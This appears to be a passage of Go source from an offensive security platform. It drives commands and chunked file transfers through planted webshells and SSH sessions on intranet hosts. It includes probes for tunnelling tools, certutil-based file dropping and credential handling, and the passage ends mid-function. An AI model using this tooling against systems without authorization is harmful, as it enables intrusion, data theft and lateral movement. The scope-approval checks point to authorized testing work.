package server

import (
	"bytes"
	"compress/gzip"
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	pathpkg "path"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Autumn-27/jingwei/db"
	"github.com/Autumn-27/jingwei/guard"
	"github.com/Autumn-27/jingwei/scanner"
)

// ---------------------------------------------------------------------------
// 内网两阶段 MVP：逻辑会话 + 隧道 + 范围审批 + 任务交接。
//
// 会话不驻留进程：每次执行都复用已登记的 webshell，cwd 由平台维护。所有能力
// 同时通过 HTTP API（无 LLM 可用）与 agent 工具（有 LLM 时）暴露，共用同一套
// 数据库表，因此人在页面上的操作与 LLM 的工具调用看到的是同一份状态。
// ---------------------------------------------------------------------------

const (
	intranetCwdMarker  = "__JW_CWD__"
	intranetEcMarker   = "__JW_EC__"
	intranetSizeMarker = "__JW_SIZE__"
	intranetGzipMarker = "__JW_GZIP__"
	intranetPSMarker   = "__JW_PS__"

	intranetChunkMarker    = "__JW_CHUNK__"
	intranetChunkEndMarker = "__JW_CHUNK_END__"
	intranetHeartbeatMark  = "__JW_HB__"

	intranetOSPosix   = "posix"
	intranetOSWindows = "windows"
	// intranetOSProbe works on both shells: cmd.exe expands %OS%, POSIX keeps
	// it literal, so the marker only appears on Windows.
	intranetOSProbe = `echo __JW_OS__%OS% & uname -s`
	// cmd.exe defaults to the OEM code page (GBK on zh-CN), which turns Chinese
	// output into invalid UTF-8 after JSON encoding. Switch this command's
	// console to UTF-8; the change is per child process, not persistent.
	intranetWindowsCodepage = `chcp 65001 >nul & `

	// intranetProbeScript must not exit: intranetScript appends the cwd/exit-code
	// trailer after the command, and a bare exit would skip it.
	intranetProbeScript = `printf '__JW_HOST__%s\n' "$(hostname 2>/dev/null)"
printf '__JW_KERNEL__%s\n' "$(uname -srm 2>/dev/null)"
printf '__JW_USER__%s\n' "$(id 2>/dev/null)"
for b in socat nc ncat ssh chisel python3 python busybox; do command -v "$b" >/dev/null 2>&1 && printf '__JW_BIN__%s\n' "$b"; done
:
`

	intranetExecTimeout = 60 * time.Second
	intranetUploadChunk = 24 * 1024
	// cmd.exe caps a command line at 8191 characters; 4 KiB of content becomes
	// ~5.5 KiB of base64 and leaves room for the cwd/chcp/trailer wrapper.
	intranetWindowsUploadChunk = 4 * 1024
	intranetDownloadChunk      = 96 * 1024
	intranetUploadLimit        = 4 << 20
	// Downloads used to be one shell command capped at 512 KiB. The chunked
	// transport makes larger files practical while every response stays small.
	intranetDownloadLimit        = 8 << 20
	intranetWindowsCertutilLimit = 2 << 20
	intranetBatchLimit           = 50
	intranetTunnelTTL            = time.Hour
	intranetTunnelMaxTTL         = 24 * time.Hour
)

// intranetExecOutcome is one terminal turn on an intranet session. It is the same
// shape the webshell and memory-horse terminals return, so an SSH session and a
// landed shell cannot disagree about what "exit 0" or "we stopped waiting" means,
// and one component renders both. The extra fields over the old
// {output, cwd, exit_code} triple are additive: existing tool and UI readers that
// ignore them keep working.
type intranetExecOutcome = shellExecResult

type intranetProbeInfo struct {
	Host   string   `json:"host,omitempty"`
	Kernel string   `json:"kernel,omitempty"`
	User   string   `json:"user,omitempty"`
	Bins   []string `json:"bins,omitempty"`
	Raw    string   `json:"raw,omitempty"`
}

// shQuote quotes a value for POSIX sh.
func shQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// intranetHost normalizes a URL/host input to a bare lowercase host.
func intranetHost(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if strings.Contains(raw, "://") {
		if u, err := url.Parse(raw); err == nil && u.Hostname() != "" {
			raw = u.Hostname()
		}
	}
	if h, _, err := net.SplitHostPort(raw); err == nil {
		raw = h
	}
	raw = strings.Trim(raw, "[]")
	return strings.ToLower(strings.TrimSuffix(strings.TrimSpace(raw), "."))
}

func intranetHostPort(host string, port int) string {
	host = strings.TrimSpace(host)
	if strings.Contains(host, ":") && !strings.HasPrefix(host, "[") {
		return "[" + host + "]:" + strconv.Itoa(port)
	}
	return host + ":" + strconv.Itoa(port)
}

// intranetScript wraps a command with cwd restoration and exit-code reporting.
// The trailing markers are parsed out of the webshell response.
func intranetScript(cwd, command string) string {
	if strings.TrimSpace(cwd) == "" {
		cwd = "/"
	}
	// 命令放进子 shell，尾部标记由 EXIT trap 打印：维持模块的部署脚本都以
	// set -e 开头，原写法里任何一步失败都会让尾部 printf 根本不执行，退出码和
	// 已产生的输出一起丢失，台账只剩「未解析到命令结束标记」这句无从复核的话。
	// 2>&1 是因为 web 壳通常只回传 stdout，目标侧的 Permission denied 一类的报错
	// 全落在 web 服务器的错误日志里，取证时看不见。cd 仍在子 shell 之外，
	// 子 shell 内的 cd 会被 trap 里的 $PWD 读到，会话目录跟踪不受影响。
	return "cd " + shQuote(cwd) + " 2>/dev/null || cd /\n" +
		"(\ntrap 'printf \"\\n" + intranetCwdMarker + "%s\\n" + intranetEcMarker + "%s\\n\" \"$PWD\" \"$?\"' EXIT\n" +
		command + "\n) 2>&1\n"
}

// intranetScriptWindows is the cmd.exe counterpart. PHP system() on Windows
// only runs the first line of a multi-line command, so everything is joined
// with "&". "call echo %^ERRORLEVEL%" defers expansion to a second parse, so
// the exit code is read before the trailer commands reset it.
func intranetScriptWindows(cwd, command string) string {
	prefix := intranetWindowsCodepage
	if p := intranetWindowsCwd(cwd); p != "" {
		if len(p) == 3 {
			prefix += "cd /d " + p + " & "
		} else {
			prefix += `cd /d "` + p + `" & `
		}
	}
	// 用括号包住用户命令：cmd 在 `if ... (...) else (...)` 条件为真时会吞掉
	// 后面的 & 链，导致尾部标记不执行、结果被误判为失败。
	return prefix + "(" + command + ") & call echo __JW_EC__%^ERRORLEVEL% & echo __JW_CWD__ & cd"
}

// intranetWindowsCwd validates a stored cwd as a drive-absolute Windows path
// that is safe to splice into a cmd.exe command line.
func intranetWindowsCwd(cwd string) string {
	cwd = strings.TrimSpace(cwd)
	if len(cwd) < 3 || cwd[1] != ':' {
		return ""
	}
	c := cwd[0]
	if !(c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z') {
		return ""
	}
	if cwd[2] != '\\' && cwd[2] != '/' {
		return ""
	}
	if strings.ContainsAny(cwd, `"&|<>^`) {
		return ""
	}
	if len(cwd) > 3 {
		cwd = strings.TrimRight(cwd, "\\/")
	}
	if len(cwd) == 2 {
		cwd += `\`
	}
	if len(cwd) == 3 && cwd[2] == '/' {
		cwd = cwd[:2] + `\`
	}
	return cwd
}

// intranetAbsCwd reports whether cwd is an absolute path for the given shell.
func intranetAbsCwd(osKind, cwd string) bool {
	if osKind == intranetOSWindows {
		return intranetWindowsCwd(cwd) != ""
	}
	return strings.HasPrefix(cwd, "/")
}

// intranetWindowsPath validates and quotes a drive-absolute Windows file path.
// Percent signs, quotes and cmd metacharacters are rejected so the path cannot
// break out of the quoted argument or expand environment variables.
func intranetWindowsPath(path string) (quoted, normalized string, ok bool) {
	p := strings.TrimSpace(path)
	if len(p) < 3 || p[1] != ':' {
		return "", "", false
	}
	c := p[0]
	if !(c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z') {
		return "", "", false
	}
	if p[2] != '\\' && p[2] != '/' {
		return "", "", false
	}
	if strings.ContainsAny(p, "\"'%&|<>^*?\x00\r\n") {
		return "", "", false
	}
	normalized = p[:2] + strings.ReplaceAll(p[2:], "/", `\`)
	return `"` + normalized + `"`, normalized, true
}

// intranetWindowsSizeCmd prints the file size in bytes via the for variable.
func intranetWindowsSizeCmd(quotedPath string) string {
	return `for %I in (` + quotedPath + `) do @echo %~zI`
}

// parseCertutilBase64 extracts the payload certutil -encode wraps between
// BEGIN/END CERTIFICATE markers, ignoring its localized progress lines.
func parseCertutilBase64(raw string) ([]byte, error) {
	const begin = "-----BEGIN CERTIFICATE-----"
	const end = "-----END CERTIFICATE-----"
	i := strings.Index(raw, begin)
	if i < 0 {
		return nil, errors.New("未找到 certutil 输出起始标记")
	}
	rest := raw[i+len(begin):]
	j := strings.Index(rest, end)
	if j < 0 {
		return nil, errors.New("未找到 certutil 输出结束标记")
	}
	body := strings.Join(strings.Fields(rest[:j]), "")
	return base64.StdEncoding.DecodeString(body)
}

// classifyOSProbe reads the OS probe echo. ok=false means the echo is not an
// answer at all (shell unreachable, 404 page, wrong protocol): callers must not
// cache that as POSIX, or a Windows box that was merely down keeps the wrong
// wrapper after it comes back.
func classifyOSProbe(raw string, err error) (kind string, ok bool) {
	if err != nil || !strings.Contains(raw, "__JW_OS__") {
		return intranetOSPosix, false
	}
	if strings.Contains(raw, "__JW_OS__Windows_NT") {
		return intranetOSWindows, true
	}
	return intranetOSPosix, true
}

// intranetOS returns the target shell family, probing once and caching the
// result in session metadata. Detection failures fall back to POSIX.
func (s *Server) intranetOS(ctx context.Context, pg *db.DB, sess *db.IntranetSession) string {
	if v, ok := sess.Metadata["os"].(string); ok && (v == intranetOSPosix || v == intranetOSWindows) {
		return v
	}
	osKind := intranetOSPosix
	// 探测失败（shell 暂时不可用、404 页面等）不能缓存为 posix：
	// 否则 Windows 会话在 shell 恢复后仍会一直使用 POSIX wrapper。
	raw, err := s.intranetSendScript(ctx, pg, sess, intranetOSProbe, 30*time.Second)
	probed, ok := classifyOSProbe(raw, err)
	if !ok {
		return osKind
	}
	osKind = probed
	if updated, err := pg.SetIntranetSessionMetadata(sess.ID, map[string]any{"os": osKind}); err == nil && updated != nil {
		*sess = *updated
	} else {
		if sess.Metadata == nil {
			sess.Metadata = map[string]any{}
		}
		sess.Metadata["os"] = osKind
	}
	return osKind
}

// intranetIsSSH reports whether a session is carried by an SSH login instead of a
// webshell. SSH sessions have no webshell_id by design: the hosts they cover are
// the ones with no web service at all.
func intranetIsSSH(sess *db.IntranetSession) bool {
	return sess != nil && sess.Transport == db.IntranetTransportSSH
}

// intranetSSHAuth resolves the SSH channel parameters of a session. The password
// is read from the credential ledger on every use so it exists in exactly one
// place; a session whose credential was deleted is dead, and says so.
func (s *Server) intranetSSHAuth(pg *db.DB, sess *db.IntranetSession) (scanner.SSHCommandTarget, error) {
	if sess == nil {
		return scanner.SSHCommandTarget{}, errors.New("无效的会话")
	}
	addr := sess.SSHDialAddr()
	if addr == "" {
		return scanner.SSHCommandTarget{}, errors.New("SSH 会话缺少目标地址")
	}
	if sess.SSHCredentialID <= 0 {
		return scanner.SSHCommandTarget{}, errors.New("SSH 会话未绑定凭据台账中的凭据")
	}
	cred, err := pg.GetIntranetCredential(sess.SSHCredentialID)
	if err != nil || cred == nil {
		return scanner.SSHCommandTarget{}, fmt.Errorf("SSH 会话绑定的凭据 #%d 已不存在，请重新登记凭据后再开会话", sess.SSHCredentialID)
	}
	if cred.SealBroken {
		// The row holds a password we cannot read. Dialing with an empty or
		// ciphertext password would come back as "authentication failed" and could
		// trip a lockout on the target, so stop and say what is actually wrong.
		return scanner.SSHCommandTarget{}, fmt.Errorf("凭据 #%d 的口令无法解封（平台签名密钥已更换），请重新登记该凭据", cred.ID)
	}
	user := strings.TrimSpace(sess.SSHUser)
	if user == "" {
		user = strings.TrimSpace(cred.Username)
	}
	if user == "" {
		return scanner.SSHCommandTarget{}, errors.New("SSH 会话缺少登录账号")
	}
	return scanner.SSHCommandTarget{Addr: addr, User: user, Password: cred.Password}, nil
}

// intranetTransportCheck fails fast when the channel a session runs on is not
// usable, so callers do not spend a probe round-trip finding out.
func (s *Server) intranetTransportCheck(pg *db.DB, sess *db.IntranetSession) error {
	if intranetIsSSH(sess) {
		_, err := s.intranetSSHAuth(pg, sess)
		return err
	}
	_, err := s.intranetShell(pg, sess)
	return err
}

// intranetSendScript delivers one already-wrapped script to the target and
// returns its raw echo. Everything above it (cwd tracking, exit codes, events)
// is transport-agnostic because both channels return the same marker protocol.
func (s *Server) intranetSendScript(ctx context.Context, pg *db.DB, sess *db.IntranetSession, script string, timeout time.Duration) (string, error) {
	if timeout <= 0 {
		timeout = intranetExecTimeout
	}
	if intranetIsSSH(sess) {
		target, err := s.intranetSSHAuth(pg, sess)
		if err != nil {
			return "", err
		}
		target.Timeout = timeout
		return scanner.RunSSHCommand(ctx, target, script)
	}
	shell, err := s.intranetShell(pg, sess)
	if err != nil {
		return "", err
	}
	payload, err := s.shellPayloadFor(shell)
	if err != nil {
		return "", err
	}
	client := scanner.NewDeepClient(timeout)
	cctx, cancel := context.WithTimeout(ctx, timeout+5*time.Second)
	defer cancel()
	return scanner.RunShellCommand(cctx, client, shell.URL, payload, script)
}

// parseIntranetOutput splits the cwd/exit-code markers off the command output.
// POSIX prints the values on the marker line; the cmd.exe trailer prints them
// on the following line. ok=false means the wrapper trailer never ran.
func parseIntranetOutput(raw string) (output, cwd string, exitCode int, ok bool) {
	exitCode = -1
	lines := strings.Split(strings.ReplaceAll(raw, "\r\n", "\n"), "\n")
	cwdIdx, ecIdx := -1, -1
	for i, line := range lines {
		t := strings.TrimSpace(line)
		if strings.HasPrefix(t, intranetCwdMarker) {
			cwdIdx = i
			cwd = strings.TrimSpace(strings.TrimPrefix(t, intranetCwdMarker))
			if cwd == "" && i+1 < len(lines) {
				cwd = strings.TrimSpace(lines[i+1])
			}
		}
		if strings.HasPrefix(t, intranetEcMarker) {
			ecIdx = i
			val := strings.TrimSpace(strings.TrimPrefix(t, intranetEcMarker))
			if val == "" && i+1 < len(lines) {
				val = strings.TrimSpace(lines[i+1])
			}
			if n, err := strconv.Atoi(val); err == nil {
				exitCode = n
			}
		}
	}
	if cwdIdx < 0 || ecIdx < 0 {
		return raw, "", -1, false
	}
	first := cwdIdx
	if ecIdx < first {
		first = ecIdx
	}
	output = strings.TrimRight(strings.Join(lines[:first], "\n"), "\n")
	return output, cwd, exitCode, true
}

func truncateIntranetOutput(s string, limit int) string {
	if limit <= 0 || len(s) <= limit {
		return s
	}
	return s[:limit] + "\n…（输出已截断）"
}

// intranetTargetAllowed applies the platform asset blocklist (always) and, in
// strict mode, the task's registered scope. Tunnels to internal hosts that are
// not yet registered must go through the scope-approval API first.
func (s *Server) intranetTargetAllowed(pg *db.DB, taskID int64, host string) (string, bool) {
	host = intranetHost(host)
	if host == "" {
		return "", true
	}
	if reason, allowed := shellAllowed(pg, host); !allowed {
		return reason, false
	}
	if taskID <= 0 {
		return "", true
	}
	pol := newGuardTargetPolicy(pg)
	verdict, reason := pol.Check(taskID, nil, []string{host})
	if verdict != guard.ScopeOut {
		return "", true
	}
	mode := pol.Mode()
	if mode == "off" {
		return "", true
	}
	if mode != "strict" {
		log.Printf("[intranet][target] 范围告警(仅记录): %s", reason)
		return "", true
	}
	return reason + "。请先在「内网渗透 → 范围审批」提交申请，批准后重试", false
}

func (s *Server) intranetSession(pg *db.DB, id int64) (*db.IntranetSession, error) {
	if id <= 0 {
		return nil, errors.New("无效的会话 ID")
	}
	sess, err := pg.GetIntranetSession(id)
	if err != nil {
		return nil, errors.New("会话不存在")
	}
	if sess.Status == db.IntranetSessionClosed {
		return nil, errors.New("会话已关闭")
	}
	return sess, nil
}

func (s *Server) intranetShell(pg *db.DB, sess *db.IntranetSession) (*db.Webshell, error) {
	if sess == nil || sess.WebshellID == nil || *sess.WebshellID <= 0 {
		return nil, errors.New("会话未绑定 webshell")
	}
	shell, err := pg.GetWebshell(*sess.WebshellID)
	if err != nil {
		return nil, errors.New("绑定的 webshell 不存在")
	}
	if strings.TrimSpace(shell.URL) == "" {
		return nil, errors.New("webshell 没有可用地址")
	}
	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
		return nil, errors.New("webshell 地址命中资产拦截规则：" + reason)
	}
	return shell, nil
}

// intranetSender adapts a session's transport (SSH login or bound webshell) to the
// channel-agnostic sender the shared terminal core drives. Both transports already
// speak the __JW_CWD__/__JW_EC__ trailer, so only the delivery differs here.
func (s *Server) intranetSender(pg *db.DB, sess *db.IntranetSession) shellSender {
	return func(ctx context.Context, script string, timeout time.Duration) (string, error) {
		return s.intranetSendScript(ctx, pg, sess, script, timeout)
	}
}

// intranetTurnLocks serializes turns on one session. Two browser tabs, or a tab
// and the background heartbeat, otherwise read the same stored cwd, run
// concurrently, and the last write wins — the terminal then resumes from a
// directory nobody asked for, and the operator reads output from the wrong place.
var intranetTurnLocks sync.Map // sessionID -> *sync.Mutex

func intranetTurnLock(sessionID int64) *sync.Mutex {
	mu, _ := intranetTurnLocks.LoadOrStore(sessionID, &sync.Mutex{})
	return mu.(*sync.Mutex)
}

// intranetRun executes one command on the session's webshell without writing an
// event (upload uses this for each chunk). It updates the stored cwd on success.
func (s *Server) intranetRun(ctx context.Context, pg *db.DB, sess *db.IntranetSession, command string, timeout time.Duration) intranetExecOutcome {
	mu := intranetTurnLock(sess.ID)
	mu.Lock()
	defer mu.Unlock()
	return s.intranetRunLocked(pg, ctx, sess, command, timeout)
}

// intranetRunLocked is one turn with the session lock already held. Callers that
// need to skip a busy session (the heartbeat) take the lock themselves with
// TryLock; everything else goes through intranetRun.
func (s *Server) intranetRunLocked(pg *db.DB, ctx context.Context, sess *db.IntranetSession, command string, timeout time.Duration) intranetExecOutcome {
	out := intranetExecOutcome{ExitCode: -1}
	if err := s.intranetTransportCheck(pg, sess); err != nil {
		out.IsError, out.Note = true, err.Error()
		return out
	}
	if timeout <= 0 {
		timeout = intranetExecTimeout
	}
	// Only a family the session already recorded counts as known. intranetOS
	// returns POSIX as a wrapper choice when its probe never answered, and feeding
	// that guess in here would let one unreachable moment pin a cmd box to the
	// POSIX wrapper for the life of the session.
	cached := ""
	if v, ok := sess.Metadata["os"].(string); ok && (v == intranetOSPosix || v == intranetOSWindows) {
		cached = v
	}
	res := shellExec(ctx, s.intranetSender(pg, sess), sess.Cwd, cached, command, timeout)
	if res.OSKind != "" && res.OSKind != cached {
		if updated, merr := pg.SetIntranetSessionMetadata(sess.ID, map[string]any{"os": res.OSKind}); merr == nil && updated != nil {
			*sess = *updated
		}
	}
	if res.Cwd == "" {
		// Delivery failed or the trailer never arrived. last_seen must not advance:
		// the stale-session scan selects on it, so touching here would mark a dead
		// session healthy because of a command that never ran.
		return res
	}
	if res.Cwd != sess.Cwd {
		if updated, uerr := pg.UpdateIntranetSessionState(sess.ID, res.Cwd, "", ""); uerr == nil && updated != nil {
			*sess = *updated
		}
	} else {
		_ = pg.TouchIntranetSession(sess.ID)
	}
	return res
}

// intranetExec records the run as a session event and returns it.
func (s *Server) intranetExec(ctx context.Context, pg *db.DB, sess *db.IntranetSession, command string, timeout time.Duration) intranetExecOutcome {
	out := s.intranetRun(ctx, pg, sess, command, timeout)
	_ = pg.AddIntranetSessionEvent(sess.ID, "exec", command, truncateIntranetOutput(out.Output, 8000), out.IsError)
	return out
}

// intranetCommandRunner abstracts one target-side command execution so the
// chunked transfer logic can be exercised against a local shell in tests.
type intranetCommandRunner func(command string, timeout time.Duration) intranetExecOutcome

// gzipIntranetContent compresses a payload only when it actually shrinks.
// Small or already-compressed files keep the plain base64 transport.
func gzipIntranetContent(content []byte) ([]byte, bool) {
	if len(content) < 512 {
		return nil, false
	}
	var buf bytes.Buffer
	zw, err := gzip.NewWriterLevel(&buf, gzip.BestSpeed)
	if err != nil {
		return nil, false
	}
	if _, err := zw.Write(content); err != nil {
		return nil, false
	}
	if err := zw.Close(); err != nil {
		return nil, false
	}
	if buf.Len() >= len(content) {
		return nil, false
	}
	return buf.Bytes(), true
}

func parseGzipChunk(raw []byte) ([]byte, bool) {
	if len(raw) < 2 || raw[0] != 0x1f || raw[1] != 0x8b {
		return nil, false
	}
	zr, err := gzip.NewReader(bytes.NewReader(raw))
	if err != nil {
		return nil, false
	}
	defer zr.Close()
	out, err := io.ReadAll(io.LimitReader(zr, int64(intranetDownloadChunk)+1))
	if err != nil {
		return nil, false
	}
	return out, true
}

func parseIntranetChunk(output string) ([]byte, bool) {
	i := strings.Index(output, intranetChunkMarker)
	if i < 0 {
		return nil, false
	}
	rest := output[i+len(intranetChunkMarker):]
	j := strings.Index(rest, intranetChunkEndMarker)
	if j < 0 {
		return nil, false
	}
	encoded := strings.Join(strings.Fields(rest[:j]), "")
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, false
	}
	return data, true
}

func parseIntranetDownloadMeta(output string) (total int64, gzipOK, ok bool) {
	total = -1
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, intranetSizeMarker):
			fields := strings.Fields(strings.TrimPrefix(line, intranetSizeMarker))
			if len(fields) == 0 {
				continue
			}
			n, err := strconv.ParseInt(fields[0], 10, 64)
			if err == nil && n >= 0 {
				total, ok = n, true
			}
		case strings.HasPrefix(line, intranetGzipMarker):
			gzipOK = strings.TrimPrefix(line, intranetGzipMarker) == "1"
		}
	}
	return total, gzipOK, ok
}

func intranetDownloadMetaCmd(path string) string {
	return "printf '" + intranetSizeMarker + "%s\\n' \"$(wc -c < " + shQuote(path) + " 2>/dev/null)\"; " +
		"command -v gzip >/dev/null 2>&1 && echo '" + intranetGzipMarker + "1' || echo '" + intranetGzipMarker + "0'"
}

func intranetDownloadChunkCmd(path string, offset, n int64, compress bool) string {
	pipe := "tail -c +" + strconv.FormatInt(offset+1, 10) + " " + shQuote(path) +
		" | head -c " + strconv.FormatInt(n, 10)
	if compress {
		pipe += " | gzip -c"
	}
	pipe += " | base64 | tr -d '\\n'"
	return "printf '" + intranetChunkMarker + "'; " + pipe + "; printf '" + intranetChunkEndMarker + "'"
}

func intranetUploadPOSIX(run intranetCommandRunner, path string, content []byte) (out intranetExecOutcome, compressed, existed bool, err error) {
	out = intranetExecOutcome{ExitCode: -1}
	probe := run("test -e "+shQuote(path)+" && echo JW_FILE_EXISTS || echo JW_FILE_NEW", 15*time.Second)
	existed = strings.Contains(probe.Output, "JW_FILE_EXISTS")

	gz, worthIt := gzipIntranetContent(content)
	gzipOK := false
	if worthIt {
		caps := run("command -v gzip >/dev/null 2>&1 && echo '"+intranetGzipMarker+"1' || echo '"+intranetGzipMarker+"0'", 15*time.Second)
		gzipOK = strings.Contains(caps.Output, intranetGzipMarker+"1")
	}
	if gzipOK {
		out, err = intranetUploadPOSIXGzip(run, path, gz, len(content))
		if err != nil {
			return out, false, existed, err
		}
		return out, true, existed, nil
	}

	for offset := 0; offset < len(content); offset += intranetUploadChunk {
		end := offset + intranetUploadChunk
		if end > len(content) {
			end = len(content)
		}
		op := ">>"
		if offset == 0 {
			op = ">"
		}
		chunk := base64.StdEncoding.EncodeToString(content[offset:end])
		cmd := "printf '%s' '" + chunk + "' | base64 -d " + op + " " + shQuote(path)
		part := run(cmd, 30*time.Second)
		if part.IsError {
			part.IsError = true
			part.Note = fmt.Sprintf("写入第 %d 块失败: %s", offset/intranetUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
			return part, false, existed, errors.New(part.Note)
		}
	}
	check := run("wc -c < "+shQuote(path), 20*time.Second)
	got, perr := strconv.ParseInt(strings.TrimSpace(check.Output), 10, 64)
	if check.IsError || perr != nil || got != int64(len(content)) {
		check.IsError = true
		check.Note = fmt.Sprintf("写入后大小不符（期望 %d，实际 %q）", len(content), strings.TrimSpace(check.Output))
		return check, false, existed, errors.New(check.Note)
	}
	out = check
	out.Output = fmt.Sprintf("已写入 %s（%d 字节）\n%s", path, len(content), strings.TrimSpace(check.Output))
	return out, false, existed, nil
}

func intranetUploadPOSIXGzip(run intranetCommandRunner, path string, gz []byte, size int) (intranetExecOutcome, error) {
	out := intranetExecOutcome{ExitCode: -1}
	suffix := ".jw" + strconv.FormatInt(time.Now().UnixNano(), 10)
	tempGZ := path + suffix + ".gz"
	tempPart := path + suffix + ".part"
	cleanup := func() {
		_ = run("rm -f "+shQuote(tempGZ)+" "+shQuote(tempPart), 10*time.Second)
	}
	for offset := 0; offset < len(gz); offset += intranetUploadChunk {
		end := offset + intranetUploadChunk
		if end > len(gz) {
			end = len(gz)
		}
		op := ">>"
		if offset == 0 {
			op = ">"
		}
		chunk := base64.StdEncoding.EncodeToString(gz[offset:end])
		cmd := "printf '%s' '" + chunk + "' | base64 -d " + op + " " + shQuote(tempGZ)
		part := run(cmd, 30*time.Second)
		if part.IsError {
			cleanup()
			part.IsError = true
			part.Note = fmt.Sprintf("写入压缩块 %d 失败: %s", offset/intranetUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
			return part, errors.New(part.Note)
		}
	}
	decompress := "gzip -dc " + shQuote(tempGZ) + " > " + shQuote(tempPart) +
		" && test \"$(wc -c < " + shQuote(tempPart) + " | tr -d '[:space:]')\" -eq " + strconv.Itoa(size) +
		" && mv -f " + shQuote(tempPart) + " " + shQuote(path)
	moved := run(decompress, 60*time.Second)
	if moved.IsError {
		cleanup()
		moved.IsError = true
		moved.Note = "解压或覆盖目标文件失败: " + strings.TrimSpace(moved.Output+moved.Note)
		return moved, errors.New(moved.Note)
	}
	cleanup()
	out = moved
	out.Output = fmt.Sprintf("已写入 %s（%d 字节，gzip 传输 %d 字节）", path, size, len(gz))
	return out, nil
}

func intranetWindowsPowerShellPath() string {
	return `%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe`
}

func intranetWindowsPSAvailableCmd() string {
	return `if exist "` + intranetWindowsPowerShellPath() + `" (echo ` + intranetPSMarker + `1) else (echo ` + intranetPSMarker + `0)`
}

func intranetUploadWindows(run intranetCommandRunner, path string, content []byte) (out intranetExecOutcome, compressed, existed bool, err error) {
	out = intranetExecOutcome{ExitCode: -1}
	target, normalized, ok := intranetWindowsPath(path)
	if !ok {
		out.IsError, out.Note = true, "Windows 目标路径必须是盘符绝对路径，且不能包含引号、% 或通配符"
		return out, false, false, errors.New(out.Note)
	}
	if strings.HasSuffix(normalized, `\`) {
		out.IsError, out.Note = true, "Windows 目标路径必须是文件而不是目录"
		return out, false, false, errors.New(out.Note)
	}

	probe := run("if exist "+target+" (echo JW_FILE_EXISTS) else (echo JW_FILE_NEW)", 15*time.Second)
	existed = strings.Contains(probe.Output, "JW_FILE_EXISTS")

	psOut := run(intranetWindowsPSAvailableCmd(), 15*time.Second)
	psOK := strings.Contains(psOut.Output, intranetPSMarker+"1")
	gz, worthIt := gzipIntranetContent(content)
	if psOK && worthIt {
		out, err = intranetUploadWindowsGzip(run, normalized, target, gz, len(content))
		if err != nil {
			return out, false, existed, err
		}
		return out, true, existed, nil
	}

	suffix := ".jw" + strconv.FormatInt(time.Now().UnixNano(), 10)
	b64Temp, _, ok := intranetWindowsPath(normalized + suffix + ".b64")
	if !ok {
		out.IsError, out.Note = true, "无法构造临时文件路径"
		return out, false, existed, errors.New(out.Note)
	}
	binTemp, _, ok := intranetWindowsPath(normalized + suffix + ".bin")
	if !ok {
		out.IsError, out.Note = true, "无法构造临时文件路径"
		return out, false, existed, errors.New(out.Note)
	}
	cleanup := func() {
		_ = run("del /f /q "+b64Temp+" "+binTemp, 10*time.Second)
	}
	for offset := 0; offset < len(content); offset += intranetWindowsUploadChunk {
		end := offset + intranetWindowsUploadChunk
		if end > len(content) {
			end = len(content)
		}
		op := ">>"
		if offset == 0 {
			op = ">"
		}
		chunk := base64.StdEncoding.EncodeToString(content[offset:end])
		part := run("echo "+chunk+op+b64Temp, 30*time.Second)
		if part.IsError {
			cleanup()
			part.IsError = true
			part.Note = fmt.Sprintf("写入第 %d 块失败: %s", offset/intranetWindowsUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
			return part, false, existed, errors.New(part.Note)
		}
	}

	decode := run("certutil -decode -f "+b64Temp+" "+binTemp, 30*time.Second)
	if decode.IsError {
		cleanup()
		decode.IsError = true
		decode.Note = "certutil 解码失败: " + strings.TrimSpace(decode.Output+decode.Note)
		return decode, false, existed, errors.New(decode.Note)
	}
	sizeOut := run(intranetWindowsSizeCmd(binTemp), 20*time.Second)
	got, _ := strconv.Atoi(strings.TrimSpace(sizeOut.Output))
	if got != len(content) {
		cleanup()
		sizeOut.IsError = true
		sizeOut.Note = fmt.Sprintf("解码后大小不符（期望 %d，实际 %q）", len(content), strings.TrimSpace(sizeOut.Output))
		return sizeOut, false, existed, errors.New(sizeOut.Note)
	}

	moved := run("move /y "+binTemp+" "+target, 20*time.Second)
	if moved.IsError {
		cleanup()
		moved.IsError = true
		moved.Note = "覆盖目标文件失败: " + strings.TrimSpace(moved.Output+moved.Note)
		return moved, false, existed, errors.New(moved.Note)
	}
	cleanup()
	out = moved
	out.Output = fmt.Sprintf("已写入 %s（%d 字节）", path, len(content))
	return out, false, existed, nil
}

func intranetUploadWindowsGzip(run intranetCommandRunner, normalized, target string, gz []byte, size int) (intranetExecOutcome, error) {
	out := intranetExecOutcome{ExitCode: -1}
	suffix := ".jw" + strconv.FormatInt(time.Now().UnixNano(), 10)
	b64Temp, _, ok := intranetWindowsPath(normalized + suffix + ".b64")
	if !ok {
		out.IsError, out.Note = true, "无法构造临时文件路径"
		return out, errors.New(out.Note)
	}
	gzName := normalized + suffix + ".gz"
	gzTemp, _, ok := intranetWindowsPath(gzName)
	if !ok {
		out.IsError, out.Note = true, "无法构造临时文件路径"
		return out, errors.New(out.Note)
	}
	binTemp, _, ok := intranetWindowsPath(normalized + suffix + ".bin")
	if !ok {
		out.IsError, out.Note = true, "无法构造临时文件路径"
		return out, errors.New(out.Note)
	}
	cleanup := func() {
		_ = run("del /f /q "+b64Temp+" "+gzTemp+" "+binTemp, 10*time.Second)
	}
	for offset := 0; offset < len(gz); offset += intranetWindowsUploadChunk {
		end := offset + intranetWindowsUploadChunk
		if end > len(gz) {
			end = len(gz)
		}
		op := ">>"
		if offset == 0 {
			op = ">"
		}
		chunk := base64.StdEncoding.EncodeToString(gz[offset:end])
		part := run("echo "+chunk+op+b64Temp, 30*time.Second)
		if part.IsError {
			cleanup()
			part.IsError = true
